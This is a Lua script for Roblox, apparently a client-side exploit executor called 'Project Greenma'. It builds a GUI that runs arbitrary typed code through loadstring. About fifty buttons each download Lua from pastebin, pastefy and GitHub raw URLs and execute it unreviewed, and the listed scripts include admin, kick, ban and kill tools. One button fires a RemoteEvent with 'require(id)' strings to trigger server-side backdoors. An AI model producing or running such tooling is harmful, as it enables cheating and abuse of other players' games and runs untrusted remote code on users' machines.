-- ========= LOGO ANIMATION (Intro) =========
do
	local LOGO = Instance.new("ScreenGui")
	local Face = Instance.new("ImageLabel")
	local Orbit = Instance.new("ImageLabel")
	local UIAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
	local UICorner = Instance.new("UICorner")
	local UIAspectRatioConstraint_2 = Instance.new("UIAspectRatioConstraint")

	LOGO.Name = "LOGO"
	LOGO.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
	LOGO.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	LOGO.ResetOnSpawn = false

	Face.Name = "Face"
	Face.Parent = LOGO
	Face.Active = true
	Face.BackgroundTransparency = 1
	Face.Position = UDim2.new(-0.085, 0, 0.409, 0)
	Face.Size = UDim2.new(0.099, 0, 0.108, 0)
	Face.Image = "rbxassetid://90913950107098"

	Orbit.Name = "Orbit"
	Orbit.Parent = Face
	Orbit.AnchorPoint = Vector2.new(0.5, 0.5)
	Orbit.BackgroundTransparency = 1
	Orbit.Position = UDim2.new(0.495, 0, 0.490, 0)
	Orbit.Size = UDim2.new(2.247, 0, 1.532, 0)
	Orbit.ZIndex = 2147483647
	Orbit.Image = "http://www.roblox.com/asset/?id=93530197731696"
	Orbit.ScaleType = Enum.ScaleType.Fit

	UIAspectRatioConstraint.Parent = Orbit
	UICorner.CornerRadius = UDim.new(1, 0)
	UICorner.Parent = Face
	UIAspectRatioConstraint_2.Parent = Face

	spawn(function()
		local Ring = Orbit
		while task.wait() do
			Ring.Rotation = (Ring.Rotation + 1) % 360
		end
	end)

	spawn(function()
		local logo = Face
		logo:TweenPosition(UDim2.new(0.465, 0, 0.441, 0), "Out", "Sine", 1)
		task.wait(2)
		logo:TweenPosition(UDim2.new(0.022, 0, 0.853, 0), "Out", "Sine", 1)
	end)
end

-- ========= MAIN GUI =========
local Greenma = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local clear = Instance.new("TextButton")
local outputContainer = Instance.new("ScrollingFrame")
local output = Instance.new("TextLabel")
local TitleLabel = Instance.new("TextLabel")
local MiniLogo = Instance.new("ImageLabel")
local MiniOrbit = Instance.new("ImageLabel")
local TextBox = Instance.new("TextBox")
local execute = Instance.new("TextButton")
local logoBtn = Instance.new("TextButton")
local R6 = Instance.new("TextButton")
local Re = Instance.new("TextButton")
local scriptlist = Instance.new("ScrollingFrame")

Greenma.Name = "Greenma"
Greenma.Parent = game.CoreGui
Greenma.ResetOnSpawn = false

Frame.Parent = Greenma
Frame.Active = true
Frame.BackgroundColor3 = Color3.fromRGB(50, 205, 50)
Frame.Position = UDim2.new(0.236, 0, 0.143, 0)
Frame.Size = UDim2.new(0, 627, 0, 381)
Frame.Draggable = true
Frame.BorderSizePixel = 2
Frame.BorderColor3 = Color3.fromRGB(0, 100, 0)

MiniLogo.Name = "MiniLogo"
MiniLogo.Parent = Frame
MiniLogo.BackgroundTransparency = 1
MiniLogo.Position = UDim2.new(0.005, 0, 0.005, 0)
MiniLogo.Size = UDim2.new(0, 28, 0, 28)
MiniLogo.Image = "rbxassetid://90913950107098"
MiniLogo.ZIndex = 10

MiniOrbit.Name = "MiniOrbit"
MiniOrbit.Parent = MiniLogo
MiniOrbit.AnchorPoint = Vector2.new(0.5, 0.5)
MiniOrbit.BackgroundTransparency = 1
MiniOrbit.Position = UDim2.new(0.5, 0, 0.5, 0)
MiniOrbit.Size = UDim2.new(2.5, 0, 2.5, 0)
MiniOrbit.Image = "http://www.roblox.com/asset/?id=93530197731696"
MiniOrbit.ScaleType = Enum.ScaleType.Fit
MiniOrbit.ZIndex = 11

spawn(function()
	local ring = MiniOrbit
	while task.wait() do
		ring.Rotation = (ring.Rotation + 1.5) % 360
	end
end)

TitleLabel.Parent = Frame
TitleLabel.BackgroundTransparency = 1
TitleLabel.Position = UDim2.new(0.048, 0, 0, 0)
TitleLabel.Size = UDim2.new(0, 560, 0, 22)
TitleLabel.Font = Enum.Font.GothamBold
TitleLabel.Text = "Project Greenma"
TitleLabel.TextColor3 = Color3.fromRGB(0, 100, 0)
TitleLabel.TextSize = 30
TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
TitleLabel.ZIndex = 10

TextBox.Parent = Frame
TextBox.BackgroundColor3 = Color3.fromRGB(144, 238, 144)
TextBox.Position = UDim2.new(0.016, 0, 0.144, 0)
TextBox.Size = UDim2.new(0, 464, 0, 193)
TextBox.ClearTextOnFocus = false
TextBox.Font = Enum.Font.Code
TextBox.MultiLine = true
TextBox.Text = "print('hello-world')"
TextBox.TextColor3 = Color3.fromRGB(0, 80, 0)
TextBox.TextSize = 18
TextBox.TextXAlignment = Enum.TextXAlignment.Left
TextBox.TextYAlignment = Enum.TextYAlignment.Top
TextBox.BorderSizePixel = 1
TextBox.BorderColor3 = Color3.fromRGB(0, 100, 0)

outputContainer.Parent = Frame
outputContainer.BackgroundColor3 = Color3.fromRGB(144, 238, 144)
outputContainer.Position = UDim2.new(0.5, 0, 0.669, 3)
outputContainer.Size = UDim2.new(0, 163, 0, 116)
outputContainer.ScrollBarThickness = 10
outputContainer.CanvasSize = UDim2.new(0, 0, 0, 200)
outputContainer.VerticalScrollBarInset = Enum.ScrollBarInset.Always
outputContainer.BorderSizePixel = 1
outputContainer.BorderColor3 = Color3.fromRGB(0, 100, 0)

output.Parent = outputContainer
output.BackgroundTransparency = 1
output.Size = UDim2.new(1, 0, 1, 0)
output.Font = Enum.Font.Code
output.Text = "Project Greenma v4.2.5 Loaded!"
output.TextColor3 = Color3.fromRGB(0, 80, 0)
output.TextSize = 14
output.TextWrapped = true
output.TextXAlignment = Enum.TextXAlignment.Left
output.TextYAlignment = Enum.TextYAlignment.Top

local function createButton(btn, parent, x, y, w, h, text, textsize)
	btn.Name = text
	btn.Parent = parent
	btn.BackgroundColor3 = Color3.fromRGB(34, 139, 34)
	btn.Position = UDim2.new(x, 0, y, 0)
	btn.Size = UDim2.new(0, w, 0, h)
	btn.Font = Enum.Font.GothamBold
	btn.Text = text
	btn.TextColor3 = Color3.fromRGB(255, 255, 255)
	btn.TextSize = textsize
	btn.BorderSizePixel = 1
	btn.BorderColor3 = Color3.fromRGB(0, 100, 0)
	btn.MouseEnter:Connect(function() btn.BackgroundColor3 = Color3.fromRGB(50, 205, 50) end)
	btn.MouseLeave:Connect(function() btn.BackgroundColor3 = Color3.fromRGB(34, 139, 34) end)
end

createButton(execute, Frame, 0.016, 0.685, 137, 27, "Execute", 25)
createButton(clear, Frame, 0.016, 0.790, 137, 23, "Clear", 25)
createButton(logoBtn, Frame, 0.25, 0.685, 137, 27, "Load", 30)
createButton(R6, Frame, 0.25, 0.785, 137, 27, "R6", 30)
createButton(Re, Frame, 0.25, 0.890, 137, 27, "Re", 30)

scriptlist.Name = "scriptlist"
scriptlist.Parent = Frame
scriptlist.Active = true
scriptlist.BackgroundColor3 = Color3.fromRGB(144, 238, 144)
scriptlist.Position = UDim2.new(0.77, 0, 0.144, 0)
scriptlist.Size = UDim2.new(0, 145, 0, 316)
scriptlist.ScrollBarThickness = 12
scriptlist.CanvasSize = UDim2.new(0, 0, 0, 4000)
scriptlist.VerticalScrollBarInset = Enum.ScrollBarInset.Always
scriptlist.BorderSizePixel = 1
scriptlist.BorderColor3 = Color3.fromRGB(0, 100, 0)

local scripts = {
	{"SSP.TXT", "https://protected-roblox-scripts.onrender.com/eb89123f6f2cdfad2f678b26616a65a7"},
	{"PRIMADON.TXT", "https://pastebin.com/raw/37iQzQp3"},
	{"DABEBY-CAR.TXT", "https://pastefy.app/xtIOQGPy/raw"},
	{"HACKER-X.TXT", "https://raw.githubusercontent.com/ian49972/SCRIPTS/refs/heads/main/Hacker%20X"},
	{"GRANDOSLA.TXT", "https://pastefy.app/Kql9VClT/raw"},
	{"EXVATOR.TXT", "https://pastefy.app/q74DFYYz/raw"},
	{"GONER.TXT", "https://raw.githubusercontent.com/gObl00x/My-Converts/refs/heads/main/Goner.lua"},
	{"HD-ADMIN.TXT", "https://raw.githubusercontent.com/PHGS971/HDadmin/refs/heads/main/HDadmin.lua"},
	{"MISTIC.TXT", "https://pastebin.com/raw/AaDfrnFK"},
	{"DOGGYARMY.TXT", "https://pastefy.app/ChM2b8Oh/raw"},
	{"POLARIA.TXT", "https://pastefy.app/agqEB2qs/raw"},
	{"BIPOLARIA.TXT", "https://pastebin.com/raw/8qFWEtWY"},
	{"ADMIN.TXT", "https://pastefy.app/ciJVZnxH/raw"},
	{"EXSER.TXT", "https://pastefy.app/7sO8ckTL/raw"},
	{"SPLITHEAD.TXT", "https://raw.githubusercontent.com/ian49972/SCRIPTS/refs/heads/main/Split"},
	{"MJOLNIR.TXT", "https://pastefy.app/JWZk5sQi/raw"},
	{"BLUUDUUD.TXT", "https://pastebin.com/raw/CcHxT0Gj"},
	{"NEKO.TXT", "https://raw.githubusercontent.com/ian49972/SCRIPTS/refs/heads/main/neko"},
	{"BLACKFIGURE.TXT", "https://raw.githubusercontent.com/ian49972/SCRIPTS/refs/heads/main/Figure"},
	{"FENRIER-PAINSIS.TXT", "https://pastefy.app/az0yaa2e/raw"},
	{"DEVOYANCE.TXT", "https://raw.githubusercontent.com/ian49972/SCRIPTS/refs/heads/main/Devoyance"},
	{"SLEDGEHAMMER.TXT", "https://pastefy.app/jmJgSbvV/raw?part=Sledgehammer"},
	{"ALLAH MAP.TXT", "https://pastebin.com/raw/NNp1NJKT"},
	{"C4 BOMBA.TXT", "https://pastefy.app/M0r9UCNQ/raw"},
	{"STEVE.TXT", "https://rawscripts.net/raw/Universal-Script-Steve-script-24707"},
	{"GRABGUN.TXT", "https://raw.githubusercontent.com/ian49972/SCRIPTS/refs/heads/main/grab"},
	{"ALL SEEING HAND.TXT", "https://raw.githubusercontent.com/ian49972/SCRIPTS/refs/heads/main/Flowey"},
	{"PATRICK.TXT", "https://raw.githubusercontent.com/ian49972/SCRIPTS/refs/heads/main/Patrick"},
	{"SHRIKE.TXT", "https://raw.githubusercontent.com/ian49972/SCRIPTS/refs/heads/main/Shrike"},
	{"POLYGONER.TXT", "https://raw.githubusercontent.com/ian49972/SCRIPTS/refs/heads/main/Polygoner"},
	{"FRIDGE.TXT", "https://raw.githubusercontent.com/ian49972/SCRIPTS/refs/heads/main/Fridge"},
	{"SOUL-REAPER.TXT", "https://raw.githubusercontent.com/mizu-dump/Lua2Loadstring/main/Main/Soulreaper.lua"},
	{"SCP-106.TXT", "https://raw.githubusercontent.com/ian49972/SCRIPTS/refs/heads/main/SCP-106"},
	{"CHRONO-SENTINEL.TXT", "https://raw.githubusercontent.com/Lock1213/Scripts/refs/heads/main/Chrono%20Sentinel%20(Converted%20With%20Music)"},
	{"RUIN-IX.TXT", "https://raw.githubusercontent.com/ian49972/SCRIPTS/refs/heads/main/RUIN%20IX"},
	{"VOID-GUARDIAN.TXT", "https://raw.githubusercontent.com/ian49972/SCRIPTS/refs/heads/main/void"},
	{"BLIND-REAPER.TXT", "https://raw.githubusercontent.com/ian49972/SCRIPTS/refs/heads/main/BLINDREAPER"},
	{"ORB.TXT", "https://raw.githubusercontent.com/mizu-dump/Lua2Loadstring/main/Main/Orb.TXT.lua"},
	{"ADMIN-NOLI.TXT", "https://raw.githubusercontent.com/ian49972/SCRIPTS/refs/heads/main/AdminNoli"},
	{"RAVAGER.TXT", "https://raw.githubusercontent.com/mizu-dump/Lua2Loadstring/main/Main/revenger.%20Lua.lua"},
	{"KILL-BOT.TXT", "https://raw.githubusercontent.com/ian49972/SCRIPTS/refs/heads/main/KillbotV2"},
	{"GMEN-KILLBOT.TXT", "https://raw.githubusercontent.com/mizu-dump/Lua2Loadstring/main/Main/GMAN-KILLBOT%20LUA.lua"},
	{"BRICK-HAMMERMAN.TXT", "https://raw.githubusercontent.com/mizu-dump/Lua2Loadstring/main/Main/AJGUKYGAYJAGA.lua"},
	{"PANDORA.TXT", "https://raw.githubusercontent.com/mizu-dump/Lua2Loadstring/main/Main/PANDORA.lua"},
	{"BAN-GUN.TXT", "https://raw.githubusercontent.com/mizu-dump/Lua2Loadstring/main/Main/BANGUN.lua"},
	{"SOUL-GUN.TXT", "https://raw.githubusercontent.com/mizu-dump/Lua2Loadstring/main/Main/Soul%20pistol.lua"},
	{"KICK-GUN.TXT", "https://raw.githubusercontent.com/mizu-dump/Lua2Loadstring/main/Main/Skidkiller.lua"},
	{"SCP-096.TXT", "https://raw.githubusercontent.com/ian49972/SCRIPTS/refs/heads/main/SCP"},
	-- NEW SCRIPT ADDED
	{"MR-PIXELS.TXT", "https://raw.githubusercontent.com/mizu-dump/Lua2Loadstring/main/Main/Shackluster.lua"}
}

local yPos = 0
for _, v in ipairs(scripts) do
	local name, url = v[1], v[2]
	local btn = Instance.new("TextButton")
	btn.Parent = scriptlist
	btn.BackgroundColor3 = Color3.fromRGB(34, 139, 34)
	btn.Position = UDim2.new(0, 0, 0, yPos)
	btn.Size = UDim2.new(0, 132, 0, 23)
	btn.Font = Enum.Font.Gotham
	btn.Text = name
	btn.TextColor3 = Color3.fromRGB(255, 255, 255)
	btn.TextSize = 16
	btn.BorderSizePixel = 1
	btn.BorderColor3 = Color3.fromRGB(0, 100, 0)

	btn.MouseEnter:Connect(function() btn.BackgroundColor3 = Color3.fromRGB(50, 205, 50) end)
	btn.MouseLeave:Connect(function() btn.BackgroundColor3 = Color3.fromRGB(34, 139, 34) end)

	btn.MouseButton1Click:Connect(function()
		if name == "ADMIN-NOLI.TXT" then
			warn("WARNING: ADMIN-NOLI.TXT has not been verified. Use at your own risk!")
		end
		loadstring(game:HttpGet(url, true))()
	end)

	yPos = yPos + 24
end

if yPos > 4000 then
	scriptlist.CanvasSize = UDim2.new(0, 0, 0, yPos + 200)
end

execute.MouseButton1Click:Connect(function()
	local code = TextBox.Text
	if code ~= "" then
		local s, e = pcall(loadstring, code)
		output.Text = s and "Executed!" or "Error: "..tostring(e)
	else
		output.Text = "No code entered."
	end
end)

clear.MouseButton1Click:Connect(function()
	TextBox.Text = ""
	output.Text = "Cleared."
end)

R6.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/sunday102711-bit/E00KIDD-r6-by-me/refs/heads/main/R6%20Real"))()
end)

Re.MouseButton1Click:Connect(function()
	local plr = game.Players.LocalPlayer
	if plr.Character and plr.Character:FindFirstChild("Humanoid") then
		plr.Character.Humanoid.Health = 0
	end
end)

logoBtn.MouseButton1Click:Connect(function()
	local text = TextBox.Text
	if game.ReplicatedStorage:FindFirstChild("RemoteEvent") then
		local id = tonumber(text)
		if id then
			pcall(function() game.ReplicatedStorage.RemoteEvent:FireServer("require("..id..")") end)
			output.Text = "Sent require("..id..")"
		else
			game.ReplicatedStorage.RemoteEvent:FireServer(text)
			output.Text = "Fired: "..text
		end
	else
		output.Text = "No RemoteEvent found."
	end
end)

output.Text = "Project Greenma v4.2.5 | MR-PIXELS (Shackluster) + KICK-GUN + SOUL-GUN + BAN-GUN + SCP-096 + Infinite Scroll Ready!"